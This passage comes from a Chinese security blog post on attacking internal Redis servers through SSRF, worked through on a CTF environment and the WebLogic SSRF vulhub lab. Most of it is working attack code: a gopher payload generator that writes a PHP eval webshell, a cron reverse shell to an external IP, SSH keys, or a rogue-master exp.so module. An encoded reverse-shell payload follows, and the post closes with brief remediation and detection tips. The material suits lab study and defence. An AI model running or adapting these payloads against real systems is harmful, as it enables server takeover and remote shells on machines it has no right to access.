<p>上面这个用于需要授权的redis攻击使用</p>
<p><a target="_blank" rel="noopener" href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a>  --这个用于目标redis是未授权的时候使用</p>
<p>这里我们输入如下命令，这里需要将恶意exp.so文件放入<code>redis-rogue-server.py</code>同目录下</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">python3 redis_rogue_server<span class="token punctuation">.</span>py <span class="token operator">-</span>path exp<span class="token punctuation">.</span>so <span class="token operator">-</span>lhost vps <span class="token operator">-</span>lport <span class="token number">5555</span>
<span class="token comment">#指定exp.so文件路径 -lhost为我们的vpsip lport设置为vps要监听的端口</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>这里实际上我们是等待被动连接，这里开启了上述服务后，我们构造命令发送</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> quote
<span class="token keyword">import</span> requests
<span class="token comment"># auth root</span>
<span class="token comment"># config set dir /tmp</span>
<span class="token comment"># config set dbfilename exp.so</span>
<span class="token comment"># slaveof vps 5555</span>
<span class="token comment"># module load /tmp/exp.so</span>
<span class="token comment"># system.rev vps 8888</span>
payload <span class="token operator">=</span> <span class="token triple-quoted-string string">"""auth root
module load /tmp/exp.so
system.rev vps 8888
quit
"""</span>
inner_url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"gopher://0.0.0.0:6379/_</span><span class="token interpolation"><span class="token punctuation">{</span>quote<span class="token punctuation">(</span>quote<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">"</span></span>
<span class="token keyword">print</span><span class="token punctuation">(</span>inner_url<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里我是分了两批payload发送，一起发送也是可以的，不过就得发送两次了，这里将得到的payload发送到ssrf漏洞点，接着就会发现我们的恶意服务收到了连接请求，但要注意在vps上开启接受反弹shell的端口。</p>
<p>最后就会发现我们成功拿到shell，这里不知为何截图都没了，懒得在搞了。</p>
<p>吐槽一手：buu题目环境害人啊，我一直不成功，还以为是我思路有问题，一直想不出来。。。。</p>
<h2 id="Weblogic-SSRF漏洞">Weblogic SSRF漏洞</h2>
<h3 id="简介">简介</h3>
<p>WebLogic是美国Oracle公司出品的一个application server确切的说是一个基于JAVAEE架构的中间件，BEA WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。</p>
<p>Weblogic中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件。</p>
<p>影响范围：</p>
<pre class="line-numbers language-none"><code class="language-none">weblogic 版本10.0.2

weblogic 版本10.3.6<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h3 id="漏洞复现">漏洞复现</h3>
<p>复现环境：<a target="_blank" rel="noopener" href="https://vulhub.org/#/environments/weblogic/ssrf/">https://vulhub.org/#/environments/weblogic/ssrf/</a></p>
<p><img src="/2023/12/27/ssrf-da-redis/image-20231231145729676.png" alt="image-20231231145729676"></p>
<p>如上图代表成功启动，这里我们直接bp抓个包，这里我先用dirsearch扫个目录</p>
<p><img src="/2023/12/27/ssrf-da-redis/image-20231231150520292.png" alt="image-20231231150520292"></p>
<p>可以发现还是有很多的，这里测试一番发现uddi这个目录很可疑</p>
<p><img src="/2023/12/27/ssrf-da-redis/image-20231231150543048.png" alt="image-20231231150543048"></p>
<p><img src="/2023/12/27/ssrf-da-redis/image-20231231150910443.png" alt="image-20231231150910443"></p>
<p>如上图，这里似乎是个未授权访问，点击第一个连接的search抓包发现，如下图存在一个url链接</p>
<p><img src="/2023/12/27/ssrf-da-redis/image-20231231151343200.png" alt="image-20231231151343200"></p>
<p>这里修改个参数值为127.0.0.1，如下图发现其好像在尝试连接这个地址，我们探测一下端口存活情况</p>
<p><img src="/2023/12/27/ssrf-da-redis/image-20231231151722586.png" alt="image-20231231151722586"></p>
<p>bp爆破端口之后发现下图，这里并没有探测到什么重点端口，这里我就不会了，看了wp发现，比我想的更复杂，这里需要探测内网。。而我只是单纯探测个端口而已</p>
<p><img src="/2023/12/27/ssrf-da-redis/image-20231231152152338.png" alt="image-20231231152152338"></p>
<p>这里顺便补充一个资料：2016乌云大会上猪猪侠师傅介绍的《WebLogic SSRF 服务探测》</p>
<p><img src="/2023/12/27/ssrf-da-redis/image-20231231152421261.png" alt="image-20231231152421261"></p>
<p>接下来就进行内网ip的探测，不过这里需要注意的是我们是用docker搭建的，因此探测的时候应该使用docker的ip段来探测</p>
<p><img src="/2023/12/27/ssrf-da-redis/image-20231231152729324.png" alt="image-20231231152729324"></p>
<p>我们开始设置爆破格式，自定义迭代器的payload类型</p>
<p><img src="/2023/12/27/ssrf-da-redis/image-20231231152918892.png" alt="image-20231231152918892"></p>
<p>这里在1中输入172，然后下方添加.分隔符</p>
<p><img src="/2023/12/27/ssrf-da-redis/image-20231231152940854.png" alt="image-20231231152940854"></p>
<p>位置2填入17与分隔符.  这里搞错了，对我的靶机来说是该填入19的</p>
<p><img src="/2023/12/27/ssrf-da-redis/image-20231231153015380.png" alt="image-20231231153015380"></p>
<p>位置三设置0-255与分隔符.  然后位置4设置0-255，但不需要设置分隔符</p>
<p><img src="/2023/12/27/ssrf-da-redis/image-20231231154011663.png" alt="image-20231231154011663"></p>
<p>开始爆破，结果如下图所示，这里的爆破就说明我们的ip是存在的，但是对应的端口不存在，那我们直接探测该ip的端口存活情况即可</p>
<p><img src="/2023/12/27/ssrf-da-redis/image-20231231155336238.png" alt="image-20231231155336238"></p>
<p><img src="/2023/12/27/ssrf-da-redis/image-20231231155534328.png" alt="image-20231231155534328"></p>
<p><img src="/2023/12/27/ssrf-da-redis/image-20231231155539276.png" alt="image-20231231155539276"></p>
<p>设置好开始爆破，如下图所示，这里的报错说明我们的端口是存活的</p>
<p><img src="/2023/12/27/ssrf-da-redis/image-20231231155623106.png" alt="image-20231231155623106"></p>
<p>Weblogic的SSRF有一个比较大的特点，就是我们可以通过传入<code>%0a%0d</code>来注入换行符，而某些服务（如redis）是通过换行符来分隔每条命令，也就说我们可以通过该SSRF攻击内网中的redis服务器。</p>
<p>那接下来我们尝试写入定时任务反弹shell</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/local/bin python</span>
<span class="token comment"># coding=utf8</span>

<span class="token keyword">try</span><span class="token punctuation">:</span>
    <span class="token keyword">from</span> urllib <span class="token keyword">import</span> quote
<span class="token keyword">except</span><span class="token punctuation">:</span>
    <span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> quote


<span class="token keyword">def</span> <span class="token function">generate_info</span><span class="token punctuation">(</span>passwd<span class="token punctuation">)</span><span class="token punctuation">:</span>
    cmd <span class="token operator">=</span> <span class="token punctuation">[</span>
        <span class="token string">"info"</span><span class="token punctuation">,</span>
        <span class="token string">"quit"</span>
    <span class="token punctuation">]</span>
    <span class="token keyword">if</span> passwd<span class="token punctuation">:</span>
        cmd<span class="token punctuation">.</span>insert<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"AUTH {}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>passwd<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> cmd


<span class="token keyword">def</span> <span class="token function">generate_shell</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> path<span class="token punctuation">,</span> passwd<span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span class="token punctuation">:</span>
    cmd <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"flushall"</span><span class="token punctuation">,</span>
           <span class="token string">"set 1 {}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span>
           <span class="token string">"config set dir {}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">,</span>
           <span class="token string">"config set dbfilename {}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">,</span>
           <span class="token string">"save"</span><span class="token punctuation">,</span>
           <span class="token string">"quit"</span>
           <span class="token punctuation">]</span>
    <span class="token keyword">if</span> passwd<span class="token punctuation">:</span>
        cmd<span class="token punctuation">.</span>insert<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"AUTH {}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>passwd<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> cmd


<span class="token keyword">def</span> <span class="token function">generate_reverse</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> path<span class="token punctuation">,</span> passwd<span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># centos</span>

    cmd <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"flushall"</span><span class="token punctuation">,</span>
           <span class="token string">"set 1 {}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span>
           <span class="token string">"config set dir {}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">,</span>
           <span class="token string">"config set dbfilename {}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">,</span>
           <span class="token string">"save"</span><span class="token punctuation">,</span>
           <span class="token string">"quit"</span>
           <span class="token punctuation">]</span>
    <span class="token keyword">if</span> passwd<span class="token punctuation">:</span>
        cmd<span class="token punctuation">.</span>insert<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"AUTH {}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>passwd<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> cmd


<span class="token keyword">def</span> <span class="token function">generate_sshkey</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> path<span class="token punctuation">,</span> passwd<span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span class="token punctuation">:</span>
    cmd <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"flushall"</span><span class="token punctuation">,</span>
           <span class="token string">"set 1 {}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span>
           <span class="token string">"config set dir {}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">,</span>
           <span class="token string">"config set dbfilename {}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">,</span>
           <span class="token string">"save"</span><span class="token punctuation">,</span>
           <span class="token string">"quit"</span>
           <span class="token punctuation">]</span>
    <span class="token keyword">if</span> passwd<span class="token punctuation">:</span>
        cmd<span class="token punctuation">.</span>insert<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"AUTH {}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>passwd<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> cmd


<span class="token keyword">def</span> <span class="token function">generate_rce</span><span class="token punctuation">(</span>lhost<span class="token punctuation">,</span> lport<span class="token punctuation">,</span> passwd<span class="token punctuation">,</span> command<span class="token operator">=</span><span class="token string">"cat /etc/passwd"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    exp_filename <span class="token operator">=</span> <span class="token string">"exp.so"</span>
    cmd <span class="token operator">=</span> <span class="token punctuation">[</span>
        <span class="token string">"SLAVEOF {} {}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>lhost<span class="token punctuation">,</span> lport<span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token string">"CONFIG SET dir /tmp/"</span><span class="token punctuation">,</span>
        <span class="token string">"config set dbfilename {}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>exp_filename<span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token string">"MODULE LOAD /tmp/{}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>exp_filename<span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token string">"system.exec {}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>command<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> <span class="token string">"${IFS}"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token comment"># "SLAVEOF NO ONE",</span>
        <span class="token comment"># "CONFIG SET dbfilename dump.rdb",</span>
        <span class="token comment"># "system.exec rm${IFS}/tmp/{}".format(exp_filename),</span>
        <span class="token comment"># "MODULE UNLOAD system",</span>
        <span class="token string">"quit"</span>
    <span class="token punctuation">]</span>
    <span class="token keyword">if</span> passwd<span class="token punctuation">:</span>
        cmd<span class="token punctuation">.</span>insert<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"AUTH {}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>passwd<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> cmd


<span class="token keyword">def</span> <span class="token function">rce_cleanup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    exp_filename <span class="token operator">=</span> <span class="token string">"exp.so"</span>
    cmd <span class="token operator">=</span> <span class="token punctuation">[</span>
        <span class="token string">"SLAVEOF NO ONE"</span><span class="token punctuation">,</span>
        <span class="token string">"CONFIG SET dbfilename dump.rdb"</span><span class="token punctuation">,</span>
        <span class="token string">"system.exec rm /tmp/{}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>exp_filename<span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> <span class="token string">"${IFS}"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token string">"MODULE UNLOAD system"</span><span class="token punctuation">,</span>
        <span class="token string">"quit"</span>
    <span class="token punctuation">]</span>
    <span class="token keyword">if</span> passwd<span class="token punctuation">:</span>
        cmd<span class="token punctuation">.</span>insert<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"AUTH {}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>passwd<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> cmd


<span class="token keyword">def</span> <span class="token function">redis_format</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">:</span>
    CRLF <span class="token operator">=</span> <span class="token string">"\r\n"</span>
    redis_arr <span class="token operator">=</span> arr<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span>
    cmd <span class="token operator">=</span> <span class="token string">""</span>
    cmd <span class="token operator">+=</span> <span class="token string">"*"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>redis_arr<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> x <span class="token keyword">in</span> redis_arr<span class="token punctuation">:</span>
        cmd <span class="token operator">+=</span> CRLF <span class="token operator">+</span> <span class="token string">"$"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> CRLF <span class="token operator">+</span> x
    cmd <span class="token operator">+=</span> CRLF
    <span class="token keyword">return</span> cmd


<span class="token keyword">def</span> <span class="token function">generate_payload</span><span class="token punctuation">(</span>passwd<span class="token punctuation">,</span> mode<span class="token punctuation">)</span><span class="token punctuation">:</span>
    payload <span class="token operator">=</span> <span class="token string">"test"</span>

    <span class="token keyword">if</span> mode <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
        filename <span class="token operator">=</span> <span class="token string">"shell.php"</span>
        path <span class="token operator">=</span> <span class="token string">"/var/www/html"</span>
        shell <span class="token operator">=</span> <span class="token string">"\n\n&lt;?=eval($_GET[0]);?&gt;\n\n"</span>

        cmd <span class="token operator">=</span> generate_shell<span class="token punctuation">(</span>filename<span class="token punctuation">,</span> path<span class="token punctuation">,</span> passwd<span class="token punctuation">,</span> shell<span class="token punctuation">)</span>

    <span class="token keyword">elif</span> mode <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
        filename <span class="token operator">=</span> <span class="token string">"root"</span>
        path <span class="token operator">=</span> <span class="token string">"/var/spool/cron/"</span>
        shell <span class="token operator">=</span> <span class="token string">"\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/192.168.246.130/5555 0&gt;&amp;1\n\n"</span>

        cmd <span class="token operator">=</span> generate_reverse<span class="token punctuation">(</span>filename<span class="token punctuation">,</span> path<span class="token punctuation">,</span> passwd<span class="token punctuation">,</span> shell<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> <span class="token string">"^"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">elif</span> mode <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">:</span>
        filename <span class="token operator">=</span> <span class="token string">"authorized_keys"</span>
        path <span class="token operator">=</span> <span class="token string">"/root/.ssh/"</span>
        pubkey <span class="token operator">=</span> <span class="token string">"\n\nssh-rsa "</span>

        cmd <span class="token operator">=</span> generate_sshkey<span class="token punctuation">(</span>filename<span class="token punctuation">,</span> path<span class="token punctuation">,</span> passwd<span class="token punctuation">,</span> pubkey<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> <span class="token string">"^"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">elif</span> mode <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">:</span>
        lhost <span class="token operator">=</span> <span class="token string">"124.220.233.26"</span>
        lport <span class="token operator">=</span> <span class="token string">"5555"</span>
        command <span class="token operator">=</span> <span class="token string">"ls /"</span>

        cmd <span class="token operator">=</span> generate_rce<span class="token punctuation">(</span>lhost<span class="token punctuation">,</span> lport<span class="token punctuation">,</span> passwd<span class="token punctuation">,</span> command<span class="token punctuation">)</span>

    <span class="token keyword">elif</span> mode <span class="token operator">==</span> <span class="token number">31</span><span class="token punctuation">:</span>
        cmd <span class="token operator">=</span> rce_cleanup<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">elif</span> mode <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">:</span>
        cmd <span class="token operator">=</span> generate_info<span class="token punctuation">(</span>passwd<span class="token punctuation">)</span>

    protocol <span class="token operator">=</span> <span class="token string">"gopher://"</span>

    ip <span class="token operator">=</span> <span class="token string">"0.0.0.0"</span>
    port <span class="token operator">=</span> <span class="token string">"6379"</span>

    payload <span class="token operator">=</span> protocol <span class="token operator">+</span> ip <span class="token operator">+</span> <span class="token string">":"</span> <span class="token operator">+</span> port <span class="token operator">+</span> <span class="token string">"/_"</span>

    <span class="token keyword">for</span> x <span class="token keyword">in</span> cmd<span class="token punctuation">:</span>
        payload <span class="token operator">+=</span> quote<span class="token punctuation">(</span>quote<span class="token punctuation">(</span>redis_format<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"^"</span><span class="token punctuation">,</span> <span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> payload


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    <span class="token comment"># 0 for webshell ; 1 for re shell ; 2 for ssh key ;</span>
    <span class="token comment"># 3 for redis rce ; 31 for rce clean up</span>
    <span class="token comment"># 4 for info</span>
    <span class="token comment"># suggest cleaning up when mode 3 used</span>
    mode <span class="token operator">=</span> <span class="token number">1</span>

    <span class="token comment"># input auth passwd or leave blank for no pw</span>
    passwd <span class="token operator">=</span> <span class="token string">''</span>

    p <span class="token operator">=</span> generate_payload<span class="token punctuation">(</span>passwd<span class="token punctuation">,</span> mode<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>选择模式1，这里只需要一次编码即可</p>
<pre class="line-numbers language-none"><code class="language-none">aaa%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2461%0D%0A%0A%0A%2A/1%20%2A%20%2A%20%2A%20%2A%20bash%20-i%20%3E%26%20/dev/tcp/192.168.246.130/5555%200%3E%261%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2416%0D%0A/var/spool/cron/%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%2A1%0D%0A%244%0D%0Aquit%0D%0Aaaa<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/27/ssrf-da-redis/image-20231231160714720.png" alt="image-20231231160714720"></p>
<p>如上图成功反弹shell，这里有点懵逼的是，我看那些师傅都在payload前后加个aaa的无用字符，不知道为何，我这里删除之后测试，依旧可以反弹shell。。。搜了多个文章也无果，希望日后可以解惑吧</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">docker exec -it 4cfd33d77a1c ip addr<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>这里我们可以通过上述命令来得知docker容器的ip地址。</p>
<h1>0x07 修复建议</h1>
<p>① Redis设置访问白名单(入 防止恶意访问和出 防止恶意设置为主从)</p>
<p>② Redis添加认证</p>
<pre class="line-numbers language-none"><code class="language-none">在配置文件/etc/redis/redis.conf中修改requirepasss属性为强口令，完成后重启服务器

动态命令设置config set requirepass YorPass<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>③ 重命名相关命令</p>
<pre class="line-numbers language-none"><code class="language-none">在配置文件/etc/redis/redis.conf中

rename-command CONFIG PDZA1DA也可以rename-command CONFIG "" 设置为空来禁用<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>对于恶意特征，可以通过MODULE LIST命令查看当前加载的模块信息，重点关注非官方加载或者SYSTEM、EXEC等恶意关键词，监控Redis服务器上Redis进程写入的so文件（Windows为DLL文件），流量中可以重点关注FULLRESYNC命令以及相关文件二进制特征（Webshell，Cron，Authorized_keys，so和DLL等）。</p>
<h1>0x08 知识总结</h1>
<h2 id="Dict协议使用注意事项">Dict协议使用注意事项</h2>
<ol>
<li>Dict协议中可以用:代替空格</li>
<li>?会截断后面的内容(写马的情况下要想办法bypass “?”)</li>
<li>dict协议一次只能发送一条数据</li>
</ol>
<h2 id="crontab写入Tips">crontab写入Tips</h2>
<ul>
<li><code>/etc/crontab</code></li>
<li><code>/etc/cron.d/*</code>：将任意文件写到该目录下，效果和crontab相同，格式也要一致，并且在该目录操作可以做到不覆盖任何其他文件的情况进行弹shell；</li>
<li><code>/var/spool/cron/root</code>：CentOS系统下root用户的cron文件；</li>
<li><code>/var/spool/cron/crontabs/root</code>：Debian系统下root用户的cron文件；</li>
</ul>
<h1>0x09 参考文章</h1>
<p><a target="_blank" rel="noopener" href="https://inhann.top/2021/09/14/redis_master_slave_rce/">redis 主从复制 RCE</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5665#toc-2">浅析Redis中SSRF的利用</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/325035.html">Redis主从复制RCE影响分析</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/242692.html">服务端请求伪造（SSRF）之Redis篇</a></p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/X5-cJtF2RC0AkoYH-PdihA">SSRF+Redis</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/263556.html">利用SSRF攻击内网Redis服务</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/242692.html">服务端请求伪造（SSRF）之Redis篇</a></p>
<p><a target="_blank" rel="noopener" href="http://www.cdcxht.com/News_read_id_178.shtml">Redis主从复制RCE分析</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/293030.html">很经典的一道CTF-WriteUP[网鼎杯 2020 玄武组]SSRFMe</a></p>
<p><a target="_blank" rel="noopener" href="https://pino-hd.github.io/2018/06/19/%E5%88%A9%E7%94%A8WebLogic-SSRF%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91Redis%E5%8F%8D%E5%BC%B9shell/">利用WebLogic SSRF漏洞攻击内网Redis反弹shell</a></p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/Ah67tLoL8EyjgH6RBumNYw">SSRF中Redis的利用</a></p>
<p><a target="_blank" rel="noopener" href="https://johnfrod.top/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/weblogic-ssrf%EF%BC%88cve-2014-4210%EF%BC%89/">WebLogic SSRF（CVE-2014-4210）</a></p>
<p><a target="_blank" rel="noopener" href="https://www.ajsafe.com/news/180.html">SSRF——weblogic vulhub 漏洞复现及攻击内网redis（一）（附批量检测脚本）</a></p>

                
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        文章作者:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="/about" rel="external nofollow noreferrer">hybcx</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        文章链接:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="http://hybcx.xyz/2023/12/27/ssrf-da-redis/">http://hybcx.xyz/2023/12/27/ssrf-da-redis/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        版权声明:
                    </i>
                </span>
                <span class="reprint-info">
                    本博客所有文章除特別声明外，均采用
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    许可协议。转载请注明来源
                    <a href="/about" target="_blank">hybcx</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">
                                    <span class="chip bg-color">基础知识</span>
                                </a>
                            
                        </div>
                    
                </div>
